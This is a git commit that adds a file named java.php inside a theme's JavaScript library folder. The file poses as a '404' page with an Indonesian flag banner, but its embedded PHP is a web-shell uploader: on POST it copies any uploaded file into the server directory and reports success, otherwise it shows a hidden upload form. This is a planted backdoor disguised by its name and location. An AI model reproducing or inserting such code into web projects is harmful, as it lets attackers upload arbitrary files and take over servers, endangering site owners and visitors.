960d3066887a267e9ff9c39ce0ca943fb574fecd
TiktakTricked <168307289+TiktakTricked@users.noreply.github.com>
2024-04-27 23:02:58 +0200

    Add files via upload

---
+++ theme/js/core/libraries/java.php
@@ -0,0 +1,4 @@
+<img class=" height="200" src="https://toppng.com/uploads/preview/illustration-of-flag-of-indonesia-indonesia-flag-logo-11562943954zddevcowom.png"/><title>404</title>
+<font face="Courier new" color="black" size="6">| Indonesia |</font>
+<style>body{font-size: 0;}h1{font-size: 12px}</style>
+<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>success</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>failed"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=gas> <br>"; }__halt_compiler();?></h1>
